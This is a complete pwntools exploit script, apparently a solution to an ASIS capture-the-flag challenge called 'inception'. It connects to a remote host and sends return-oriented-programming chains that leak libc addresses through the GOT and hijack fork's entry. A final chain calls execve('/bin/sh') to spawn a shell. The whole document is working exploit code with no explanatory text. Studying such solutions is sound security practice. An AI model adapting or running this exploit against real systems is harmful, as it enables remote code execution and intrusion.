from pwn import *

target = ELF('./inception')
POP_RDI_ABS = 0x400cf3
POP_RSI_R15_ABS = 0x400cf1
WRITABLE_ADDR = 0x6020f0

# # r = process(['strace', '-f', './inception'], stderr=2)
# r = process('./inception')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# POP_RDX = 0x1b92
# BIN_SH = 0x1619d9

r = remote('37.139.17.37', 1338)
libc = ELF('./libc.so.6')
POP_RDX = 0x1b96
BIN_SH = 0x1b3e9a

payload_child = ''
payload_child += 'ASIS{N0T_R34LLY_4_FL4G}\x00'
payload_child += 'A' * (0x28 - len(payload_child))

payload_child += p64(POP_RSI_R15_ABS)
payload_child += p64(target.got['write'])
payload_child += p64(0)
payload_child += p64(target.plt['write'])

payload_child += p64(POP_RDI_ABS)
payload_child += p64(0)
payload_child += p64(POP_RSI_R15_ABS)
payload_child += p64(target.got['fork'])
payload_child += p64(0)
payload_child += p64(target.plt['read'])

payload_child += p64(target.plt['fork'])
payload_child += p64(0x80)

payload_child += p64(POP_RSI_R15_ABS)
payload_child += p64(WRITABLE_ADDR)
payload_child += p64(0)
payload_child += p64(target.plt['read'])

payload_child += p64(POP_RDI_ABS)
payload_child += p64(6)
payload_child += p64(target.plt['write'])

log.info(hex(len(payload_child)))

r.sendlineafter("Let's do something: ", payload_child)

r.recvuntil('Yeah tha')
LIBC_BASE = u64(r.recv(8)) - libc.symbols['write']
log.info(hex(LIBC_BASE))

r.send(p64(LIBC_BASE + POP_RDX))

payload_parent = ''
payload_parent += 'TRANSMISSION_OVER\x00'
payload_parent += 'A' * (0x28 - len(payload_parent))

payload_parent += p64(POP_RDI_ABS)
payload_parent += p64(LIBC_BASE + BIN_SH)
payload_parent += p64(POP_RSI_R15_ABS)
payload_parent += p64(0)
payload_parent += p64(0)
payload_parent += p64(LIBC_BASE + POP_RDX)
payload_parent += p64(0)
payload_parent += p64(LIBC_BASE + libc.symbols['execve'])

log.info(hex(len(payload_parent)))

r.sendline(payload_parent)

r.interactive()
